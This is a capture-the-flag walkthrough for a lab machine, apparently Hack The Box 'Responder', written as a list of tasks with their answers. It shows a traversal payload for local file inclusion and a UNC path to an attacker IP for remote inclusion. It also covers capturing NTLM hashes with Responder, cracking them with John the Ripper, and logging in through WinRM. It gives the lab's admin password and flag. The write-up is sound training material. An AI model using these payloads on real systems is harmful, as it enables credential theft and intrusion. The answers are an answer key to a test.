# README

## STARTING POINT

* Start the Machine by Downloading the OpenVPN file that is provided by HTB

```bash
sudo openvpn <file.ovpn>
```

* TTL OS Identification And Nmap Scan

{% stepper %}
{% step %}
### TASK 1

When visiting the web service using the IP address, what is the domain that we are being redirected to?

**Answer:** `unika.htb`

{% hint style="info" %}
**NOTE:-** To solve is this clear browsing history.
{% endhint %}
{% endstep %}

{% step %}
### TASK 2

Which scripting language is being used on the server to generate webpages?

**Answer:** `php`

* Identified by wappalyzer
{% endstep %}

{% step %}
### TASK 3

What is the name of the URL parameter which is used to load different language versions of the webpage?

**Answer:** `page`

* Check the website found nothing particular of interest, although there is a language parameter which is a navbar change from EN option to FR French version of website.
* Its used page parameter to change the langauge.
{% endstep %}

{% step %}
### TASK 4

Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: `"french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"`

**Answer:** `../../../../../../../../windows/system32/drivers/etc/hosts`

* Its Vulnerably to Directory traversal and File Inclusion.
{% endstep %}

{% step %}
### TASK 5

Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: `"french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"`

**Answer:** `//10.10.14.6/somefile`

* Try the Injection And Failed.
{% endstep %}

{% step %}
### TASK 6

What does NTLM stand for?

**Answer:** `New Technology Lan Manager`
{% endstep %}

{% step %}
### TASK 7

Which flag do we use in the Responder utility to specify the network interface?

**Answer:** `-I`

* Using the responder to get initials access by capturing the NTLM hash in response listing.

Ifconfig

Attacker IP-Address in Query Parameteres

Got the NTML Hash
{% endstep %}

{% step %}
### TASK 8

There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?

**Answer:** `John The Ripper`

* Cracking the hash using john.
{% endstep %}

{% step %}
### TASK 9

What is the password for the administrator user?

**Answer:** `badminton`

* Get the initially access using evil-winrm
{% endstep %}

{% step %}
### TASK 10

We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?

**Answer:** `5985`
{% endstep %}
{% endstepper %}

## SUBMIT FLAG

**Answer:** `ea81b7afddd03efaa0945333ed147fac`

Got the Flag
